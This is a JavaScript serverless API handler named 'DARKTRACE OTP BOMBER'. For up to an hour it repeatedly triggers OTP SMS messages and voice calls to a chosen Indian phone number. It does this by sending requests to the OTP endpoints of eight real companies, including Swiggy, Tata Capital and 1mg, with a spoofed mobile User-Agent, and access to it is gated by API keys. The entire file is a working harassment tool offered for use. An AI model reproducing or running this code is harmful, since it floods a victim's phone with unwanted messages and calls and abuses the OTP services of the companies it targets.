// api/bomber.js
const fs = require('fs');
const path = require('path');

// Load keys from keys.json
const keysPath = path.join(process.cwd(), 'keys.json');
let keys = {};

try {
  if (fs.existsSync(keysPath)) {
    keys = JSON.parse(fs.readFileSync(keysPath, 'utf8'));
  }
} catch (error) {
  console.error('Error loading keys.json:', error);
}

// Working OTP services
const services = [
  {
    name: "Tata Capital",
    type: "VOICE CALL",
    url: "https://mobapp.tatacapital.com/api/v1/otp/send",
    method: "POST",
    body: (phone) => JSON.stringify({ mobileNumber: phone })
  },
  {
    name: "Swiggy",
    type: "VOICE CALL", 
    url: "https://profile.swiggy.com/api/v1/otp/send",
    method: "POST",
    body: (phone) => JSON.stringify({ mobile: phone })
  },
  {
    name: "1mg",
    type: "VOICE CALL",
    url: "https://www.1mg.com/otp/send",
    method: "POST",
    body: (phone) => JSON.stringify({ phone: phone })
  },
  {
    name: "Bikroy",
    type: "SMS",
    url: "https://bikroy.com/api/v1/otp/send",
    method: "POST",
    body: (phone) => JSON.stringify({ mobile: phone })
  },
  {
    name: "eCourier",
    type: "SMS",
    url: "https://backoffice.ecourier.com.bd/api/otp",
    method: "POST",
    body: (phone) => JSON.stringify({ phone_number: phone })
  },
  {
    name: "Eon Bazar",
    type: "SMS",
    url: "https://app.eonbazar.com/api/v1/otp",
    method: "POST",
    body: (phone) => JSON.stringify({ mobile: phone })
  },
  {
    name: "Swap BD",
    type: "SMS",
    url: "https://api.swap.com.bd/api/otp/send",
    method: "POST",
    body: (phone) => JSON.stringify({ phone: phone })
  },
  {
    name: "Fundesh",
    type: "SMS",
    url: "https://fundesh.com.bd/api/otp",
    method: "POST",
    body: (phone) => JSON.stringify({ mobile: phone })
  }
];

// Make bomb request
async function makeBombRequest(service, phone, batchNum, requestNum) {
  try {
    const response = await fetch(service.url, {
      method: service.method,
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36"
      },
      body: service.body(phone)
    });

    const status = response.status;
    const isSuccess = status >= 200 && status < 300;

    return {
      batch: batchNum,
      request: requestNum,
      service: service.name,
      type: service.type,
      status: isSuccess ? "SUCCESS" : "FAILED",
      code: status
    };

  } catch (error) {
    return {
      batch: batchNum,
      request: requestNum,
      service: service.name,
      type: service.type,
      status: "FAILED",
      code: 0
    };
  }
}

// Format phone number
function formatPhoneNumber(phone) {
  const cleaned = phone.toString().replace(/\D/g, '');
  
  if (cleaned.length === 10 && /^[6-9]/.test(cleaned)) {
    return '91' + cleaned;
  }
  
  if (cleaned.length === 12 && cleaned.startsWith('91') && /^91[6-9]/.test(cleaned)) {
    return cleaned;
  }
  
  return null;
}

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { key, num, duration = 10 } = req.query;

  // Validate API key
  if (!key || !keys.validKeys?.includes(key)) {
    return res.status(401).json({ 
      error: "Invalid API key"
    });
  }

  // Validate phone number
  const formattedPhone = formatPhoneNumber(num);
  if (!formattedPhone) {
    return res.status(400).json({ 
      error: "Invalid phone number - Must be 10 digit Indian number"
    });
  }

  // Validate duration
  const durationNum = parseInt(duration);
  if (isNaN(durationNum) || durationNum < 1 || durationNum > 60) {
    return res.status(400).json({ 
      error: "Duration must be 1-60 minutes"
    });
  }

  // Set response headers for streaming
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Transfer-Encoding', 'chunked');

  const startTime = new Date();
  const endTime = new Date(startTime.getTime() + durationNum * 60000);

  // Send initial response
  res.write(`🚀 DARKTRACE OTP BOMBER STARTED\n`);
  res.write(`📞 Target: ${formattedPhone}\n`);
  res.write(`⏰ Duration: ${durationNum} minutes\n`);
  res.write(`🔁 Running until: ${endTime.toLocaleString()}\n`);
  res.write(`==========================================\n\n`);

  let batchCount = 0;
  const batchSize = services.length;
  const endTimestamp = Date.now() + (durationNum * 60 * 1000);

  // Main bombing loop
  while (Date.now() < endTimestamp) {
    batchCount++;
    res.write(`🎯 BATCH #${batchCount} STARTED\n`);

    const promises = services.map((service, index) => 
      makeBombRequest(service, formattedPhone, batchCount, index + 1)
    );

    try {
      const results = await Promise.all(promises);

      // Send results to client
      for (const result of results) {
        const statusIcon = result.status === "SUCCESS" ? "✅" : "❌";
        res.write(`   🔄 [${result.request}/${batchSize}] ${result.type} - ${result.service}\n`);
        res.write(`     ${statusIcon} ${result.status} - Code: ${result.code}\n`);
        
        await new Promise(resolve => setTimeout(resolve, 100));
      }

      res.write(`\n🎯 BATCH #${batchCount} COMPLETED\n`);
      res.write(`==========================================\n\n`);

    } catch (error) {
      res.write(`❌ ERROR in batch ${batchCount}: ${error.message}\n`);
    }

    if (Date.now() >= endTimestamp) break;
    await new Promise(resolve => setTimeout(resolve, 2000));
  }

  res.write(`\n✅ BOMBING COMPLETED\n`);
  res.write(`📊 Total batches: ${batchCount}\n`);
  res.write(`⏰ Finished at: ${new Date().toLocaleString()}\n`);

  res.end();
}
